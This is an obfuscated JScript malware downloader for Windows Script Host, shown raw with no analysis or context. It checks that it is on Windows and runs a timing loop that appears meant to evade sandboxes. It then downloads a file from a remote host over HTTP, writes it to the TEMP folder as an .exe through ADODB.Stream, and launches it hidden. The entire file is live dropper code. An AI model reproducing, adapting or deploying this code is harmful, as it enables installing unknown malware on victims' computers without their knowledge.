var _HA = false;
var _SB = "CreateObject";
var _L0 = function _R() {return WScript[_SB]("WScript"+".Shell");}(), _DN = 11;
var _IO = "MSXML2.XMLHTTP";
var _H = 2123213;
var _XB = 0;
function _F(_VF){_L0["Run"](_VF, _XB, _XB);};
function _YW(){return _IO + "";};
function _J(_N1, _Y){_XB = _XB * 1; return _N1 - _Y;};
function _N(){return _SB;};
/*@cc_on
  @if (@_win32 || @_win64)
    _HA = true;
  @end
@*/
if (_HA)
{
var _L = "";
function _S(){return 22;};
var _ZK = 0; var _N0 = 0;
function _LM()
{
var _X = new this["Date"]();
var _U = _X["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _X = new this["Date"]();
var _PO = _X["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _X = new this["Date"]();
var _C = _X["getUTCMilliseconds"]();
var _ZK = "_IN";
_ZK = _J(_PO, _U);
var _N0 = "_J0";
_N0 = _J(_C, _PO);
_L = "open";
return _J(_ZK, _N0);
}
var _VZ = false;
var _E = false;
for (var _S0 = _XB; _S0 < _S() * 1; _S0++){if (_LM() != _XB){
_VZ = true; 
_N0 = "31" + 11 * _ZK + _N0; 
_E = true; 
break;
}}
function _M() {return ((_VZ == true) && (_VZ == _E)) ? 1 : _XB;};
if (_VZ && _M() && _E){
function _A() {return _L0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Mbv66Jl7Qt.ex" + "e";};
 _C0 = _YW();
 _I = WScript[_SB](_C0);
 var _A0 = 1;
 while (_A0){
try {
	if (_A0 == 1)
	{
		_I[_L]("GET", "http://ihlasauracleanmax.co/j3dlad", false);
		_I["send"]();
		_AB = "Sleep";
	}
	WScript[_AB](_S() + 120); 
	if (_I["readystate"] < 2 * 2) continue;
	_A0 = _XB;
	function _RB(_SY) {var _OJ = (1, 2, 3, 4, 5, _SY); return _OJ;};
	_J1 = WScript[_N()]("ADODB.Stream");
	_C0 = _J1;
	_C0[_L]();
	_C0["type"] = _RB(1);
	_C0["write"](_I["ResponseBody"]);
	_J1["position"] = _RB(_XB);
	_C0["Save" + "ToFile"](_A(), 2);
	_J1["cl"+"ose"]();
	_PR = _A();
	_F(_PR);
} catch(_MX){};
}
}
}

